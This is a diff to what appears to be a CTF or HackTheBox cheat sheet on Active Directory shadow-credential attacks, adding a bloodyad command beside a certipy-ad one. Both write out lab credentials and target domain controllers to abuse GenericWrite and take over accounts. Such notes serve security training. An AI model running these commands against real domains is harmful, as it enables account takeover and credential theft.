@@ -43,6 +43,12 @@ Abusing GenericWrite to an service account and requesting NTLM Hash.
 certipy-ad shadow auto -u 'p.agila@fluffy.htb' -p prometheusx-303 -account winrm_svc -dc-ip 10.129.19.236
 ```
 
+or with bloodyad
+
+```
+bloodyad --host 10.129.232.75 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add shadowCredentials adam.silver
+```
+
 ---
 
 Shadow Credential Attack NTLM Auth
